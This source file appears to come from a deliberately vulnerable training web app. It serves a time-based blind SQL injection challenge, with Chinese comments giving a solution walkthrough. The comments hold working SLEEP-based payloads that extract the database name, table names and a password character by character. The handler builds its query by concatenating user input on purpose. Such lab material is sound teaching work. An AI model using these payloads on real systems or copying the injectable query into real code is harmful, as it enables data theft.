const db = require('../../config/db');

/*
时间盲注 (Time-Based Blind Injection) 解题思路：

1. 时间盲注是在布尔盲注的基础上，利用数据库的延时函数，通过观察响应时间差异来获取信息
2. 本挑战不会返回任何查询结果信息，只有响应时间的差异

3. 解题步骤：
   a. 首先确认存在注入漏洞:
      1 OR SLEEP(3)  (响应会延迟3秒)
      
   b. 利用条件语句和SLEEP函数构造判断:
      1 AND IF(ASCII(SUBSTRING(database(),1,1))=119, SLEEP(3), 0)
      (如果数据库名第一个字符ASCII值是119，即'w'，则延迟3秒)
      
   c. 逐位猜解数据库名:
      1 AND IF(ASCII(SUBSTRING(database(),1,1))=119, SLEEP(3), 0)
      1 AND IF(ASCII(SUBSTRING(database(),2,1))=101, SLEEP(3), 0)
      ...以此类推
      
   d. 猜解表名、列名和数据，原理同上:
      1 AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))=117, SLEEP(3), 0)
      
4. 可以编写自动化脚本进行猜解，观察响应时间差异

5. 成功的注入语句示例:
   1 AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a', SLEEP(3), 0)
*/

// 渲染SQL注入Level 5页面
exports.renderPage = (req, res) => {
  res.render('sqli/level5', {
    title: 'SQL注入 - Level 5 (时间盲注)',
    activeMenu: 'sqli',
    result: '查询处理中...',
    error: null,
    query: ''
  });
};

// 处理SQL注入Level 5查询
exports.processQuery = async (req, res) => {
  const { id } = req.body;
  let result = '查询已完成';
  let error = null;
  
  try {
    // 不安全的查询 - 直接拼接用户输入
    const sql = `SELECT id FROM users WHERE id = ${id}`;
    
    // 记录开始时间
    const startTime = Date.now();
    
    // 尝试执行查询
    const pool = db.getPool();
    if (!pool) {
      throw new Error('数据库未连接');
    }
    
    await pool.execute(sql);
    
    // 计算查询时间
    const queryTime = Date.now() - startTime;
    result = `查询已完成，用时: ${queryTime}ms`;
  } catch (err) {
    console.error('SQL注入Level 5查询错误:', err);
    error = err.message;
  }
  
  res.render('sqli/level5', {
    title: 'SQL注入 - Level 5 (时间盲注)',
    activeMenu: 'sqli',
    result,
    error,
    query: id
  });
}; 